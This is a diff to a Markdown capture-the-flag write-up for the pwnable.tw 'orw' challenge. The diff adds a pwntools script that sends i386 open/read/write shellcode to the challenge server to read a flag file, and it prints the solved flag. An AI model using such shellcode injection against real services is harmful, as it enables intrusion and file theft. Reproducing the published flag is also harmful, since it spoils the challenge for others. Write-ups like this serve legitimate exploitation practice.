@@ -1,7 +1,5 @@
-# orw (2更)
-氣死 跟上一題一樣,被 syscall 陰了
+# orw 
 
-又是 i386搞鬼
 ```=
 orw: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-
 linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e60ecccd9d01c8217387e8b77e9261a1f36b5030, not stripped
@@ -74,4 +72,23 @@ mov ecx, esp
 mov ebx, 1
 mov eax, 4
 int 0x80              ; write
+```
+
+
+payload
+
+
+```python
+from pwn import *
+
+r = remote('chall.pwnable.tw',10001)
+
+payload = shellcraft.i386.linux.open('/home/orw/flag', 0)
+payload += shellcraft.i386.linux.read(3, 'esp', 100)
+payload += shellcraft.i386.linux.write(1, 'esp', 100)
+print (payload)
+r.sendafter('shellcode:', asm(payload))
+r.interactive()
+
+# FLAG{sh3llc0ding_w1th_op3n_r34d_writ3}
 ```
